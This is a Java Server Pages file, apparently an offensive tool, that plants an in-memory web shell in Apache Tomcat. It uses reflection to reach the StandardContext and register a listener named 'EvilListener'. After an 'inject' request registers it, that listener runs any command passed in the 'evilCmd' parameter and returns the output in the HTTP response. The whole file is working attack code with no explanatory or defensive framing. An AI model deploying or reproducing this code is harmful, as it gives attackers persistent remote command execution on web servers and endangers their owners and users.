<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%
    class EvilListener implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            // This method is called when a request comes
            ServletRequest request = sre.getServletRequest();
            String cmd = request.getParameter("evilCmd");
            if (cmd != null) {
                try {
                    Field requestField = request.getClass().getDeclaredField("request");
                    System.out.println("request runtime class: " + request.getClass());
                    requestField.setAccessible(true);
                    Object realRequest = requestField.get(request);

                    // get current response object using reflection
                    Field responseField = realRequest.getClass().getDeclaredField("response");
                    responseField.setAccessible(true);
                    HttpServletResponse response = (HttpServletResponse) responseField.get(realRequest);

                    response.reset();
                    ServletOutputStream output = response.getOutputStream();
                    InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();

                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = input.read(buffer)) != -1) {
                        output.write(buffer, 0, len);
                    }

                    output.flush();
                    output.close();
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    if (request.getParameter("inject") != null) {
        try {
            // get ApplicationContextFacade obj
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
            // access the private ApplicationContext field using reflection
            Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
            appCtxFacadeField.setAccessible(true);

            // get ApplicationContext obj
            ApplicationContext ctx2 = (ApplicationContext) appCtxFacadeField.get(ctx1);
            // access the private StandardContext field using reflection
            Field appCtxField = ApplicationContext.class.getDeclaredField("context");
            appCtxField.setAccessible(true);

            // get StandardContext obj
            StandardContext ctx3 = (StandardContext) appCtxField.get(ctx2);

            // add EvilListener
            ctx3.addApplicationEventListener(new EvilListener());
            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>